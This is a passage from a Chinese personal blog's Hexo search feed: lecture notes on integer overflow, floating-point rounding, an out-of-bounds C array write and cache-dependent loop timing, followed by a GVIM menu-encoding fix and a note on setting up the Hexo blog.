   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">40000</span> * <span class="number">40000</span> --&gt; <span class="number">1600000000</span></span><br><span class="line"><span class="number">50000</span> * <span class="number">50000</span> --&gt; ?</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Float’s:</span><br><span class="line">(1e20 + -1e20) + 3.14 --&gt; 3.14</span><br><span class="line">1e20 + (-1e20 + 3.14) --&gt; ??</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">double</span> d;</span><br><span class="line">&#125; <span class="keyword">struct_t</span>;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">struct_t</span> s;</span><br><span class="line">s.d = <span class="number">3.14</span>;</span><br><span class="line">s.a[i] = <span class="number">1073741824</span>; <span class="comment">/* Possibly out of bounds */</span></span><br><span class="line"><span class="keyword">return</span> s.d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fun(<span class="number">0</span>) --&gt; <span class="number">3.14</span></span><br><span class="line">fun(<span class="number">1</span>) --&gt; <span class="number">3.14</span></span><br><span class="line">fun(<span class="number">2</span>) --&gt; <span class="number">3.1399998664856</span></span><br><span class="line">fun(<span class="number">3</span>) --&gt; <span class="number">2.00000061035156</span></span><br><span class="line">fun(<span class="number">4</span>) --&gt; <span class="number">3.14</span></span><br><span class="line">fun(<span class="number">6</span>) --&gt; Segmentation fault</span><br></pre></td></tr></table></figure><h2 id="C-and-C-do-not-provide-any-memory-protection"><a href="#C-and-C-do-not-provide-any-memory-protection" class="headerlink" title="C and C++ do not provide any memory protection"></a>C and C++ do not provide any memory protection</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copyij</span><span class="params">(<span class="keyword">int</span> src[<span class="number">2048</span>][<span class="number">2048</span>],</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">int</span> dst[<span class="number">2048</span>][<span class="number">2048</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2048</span>; i++)</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">2048</span>; j++)</span><br><span class="line">dst[i][j] = src[i][j];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.3ms</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copyji</span><span class="params">(<span class="keyword">int</span> src[<span class="number">2048</span>][<span class="number">2048</span>],</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">int</span> dst[<span class="number">2048</span>][<span class="number">2048</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">2048</span>; j++)</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2048</span>; i++)</span><br><span class="line">dst[i][j] = src[i][j];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行时间81.8ms</p><h2 id="Performance-depends-on-access-patterns"><a href="#Performance-depends-on-access-patterns" class="headerlink" title="Performance depends on access patterns"></a>Performance depends on access patterns</h2><p>之后半节课就一直在讲 Academic Integrity 的问题</p><p>最后就是简单介绍一下课程内容</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>解决GVIM菜单乱码</title>
      <link href="/2017/11/20/%E8%A7%A3%E5%86%B3GVIM%E8%8F%9C%E5%8D%95%E4%B9%B1%E7%A0%81/"/>
      <url>/2017/11/20/%E8%A7%A3%E5%86%B3GVIM%E8%8F%9C%E5%8D%95%E4%B9%B1%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>因为系统语言经常变化的缘故，突然发现GVIM的菜单出现乱码。<br>主要解决方案参考<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/gatieme/AderXCoding/tree/master/system/tools/vim/gvim_chinese</span><br></pre></td></tr></table></figure></p><p>还可以解决文件显示乱码、菜单乱码、consle乱码。马一下。<br>因为只出现了菜单乱码<br>所以只用在_vimrc 文件中加入以下代码即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">source $VIMRUNTIME/delmenu.vim</span><br><span class="line">source $VIMRUNTIME/menu.vim</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Start</title>
      <link href="/2017/11/19/Start/"/>
      <url>/2017/11/19/Start/</url>
      
        <content type="html"><![CDATA[<p>终于忙里偷闲把这里给搭好了。连续忙了两周，下周还要继续忙。<br>原本是上周把搭建的基本工作完成的，基本是参考<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/limedroid/HexoLearning</span><br><span class="line">https://hexo.io/zh-cn/docs/index.html</span><br></pre></td></tr></table></figure></p><p>这里来完成的。途中好像确实踩了几个坑，但是现在都忘了。</p><p>因为记忆力的减退，以后就把这里当作折腾的备忘录了。</p><p>略微提一下部署Hexo遇到的坑：</p><ol><li><p>环境变量（主要是安装和部署命令没跑起来）</p></li><li><p>GitHub 匿名邮箱的坑，具体细节忘了</p></li><li><p>网络环境差，整个过程中间可能会因为网络莫名中断或者龟速。</p></li><li><p>进行配置时，需要在冒号： 后加一个英文空格</p></li><li><p>一开始看readme可以少走很多弯路</p></li></ol><p>目前还很简陋，需要修修补补。</p>]]></content>
      
      
      
    </entry>
    
  
  
</search>
